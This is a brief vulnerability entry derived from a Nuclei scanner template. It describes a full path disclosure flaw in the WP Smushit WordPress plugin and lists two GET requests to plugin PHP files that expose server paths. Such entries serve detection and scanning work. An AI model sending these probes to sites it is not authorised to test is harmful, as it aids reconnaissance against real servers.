# Vulnerability: WP Smushit - Full Path Disclosure
**Classification:** DEBUG
**Source:** Nuclei Template (`wp-smushit-fpd.yaml`)

## Description
Smushit WordPress plugin contains a full path disclosure vulnerability due to improper access restrictions in its source files, allowing unauthenticated attackers to retrieve full server paths and aiding exploitation.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/wp-smushit/core/cdn/class-cdn-controller.php
GET {{BaseURL}}/wp-content/plugins/wp-smushit/wp-smush.php
```

